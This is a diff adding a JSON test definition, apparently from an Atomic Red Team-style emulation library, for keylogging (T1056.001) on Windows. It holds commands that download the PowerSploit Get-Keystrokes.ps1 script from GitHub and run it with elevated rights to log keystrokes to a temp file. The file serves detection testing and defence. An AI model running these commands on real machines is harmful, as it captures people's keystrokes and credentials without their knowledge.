@@ -1,0 +1,38 @@
+{
+    "name": "Input Capture",
+    "description": "Utilize PowerShell and external resource to capture keystrokes [Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1) Provided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)  Upon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "&\"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\" -LogPath #{filepath}\n",
+        "cleanup_command": "Remove-Item $env:TEMP\\key.log -ErrorAction Ignore\n",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1056.001",
+    "tactics": [
+        "Credential Access",
+        "Collection"
+    ],
+    "technique": "Keylogging",
+    "source": "ART",
+    "uuid": "d9b633ca-8efb-45e6-b838-70f595c6ae26",
+    "arguments": {
+        "filepath": {
+            "description": "Name of the local file, include path.",
+            "type": "path",
+            "default": "$env:TEMP\\key.log"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Get-Keystrokes PowerShell script must exist on disk at PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\n",
+            "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\") -Force | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
